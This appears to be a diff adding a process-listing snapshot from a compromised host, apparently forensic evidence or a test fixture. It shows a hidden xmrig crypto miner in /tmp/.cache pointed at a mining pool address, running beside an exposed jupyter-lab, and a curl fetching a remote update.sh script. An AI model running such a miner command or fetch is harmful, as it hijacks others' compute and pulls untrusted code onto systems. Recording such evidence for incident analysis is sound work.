@@ -1,0 +1,6 @@
+Snapshot time: 2026-03-14T12:40:06Z (host clock; estimated UTC offset +92s)
+PID USER     %CPU %MEM COMMAND
+1   root     0.0  0.1 /sbin/init
+884 j.mercer 0.1  1.8 jupyter-lab --ip=0.0.0.0
+1922 j.mercer 387.4 3.2 /tmp/.cache/xmrig --donate-level=0 --url=stratum+tcp://192.0.2.77:3333
+1930 j.mercer 0.0  0.2 curl -fsSL https://research-tools.example/update.sh
